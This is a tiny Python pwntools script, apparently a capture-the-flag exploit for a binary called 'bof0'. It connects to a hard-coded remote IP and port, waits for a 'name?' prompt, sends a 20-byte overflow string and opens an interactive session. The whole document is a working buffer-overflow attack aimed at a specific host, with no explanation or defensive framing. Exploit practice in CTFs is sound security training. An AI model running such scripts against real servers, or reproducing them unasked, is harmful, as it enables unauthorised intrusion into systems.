from pwn import *

# p = process('./bof0')
p = connect('45.77.39.59',10001)

p.recvuntil(b'name?')
p.sendline(b'A'*20)
p.interactive()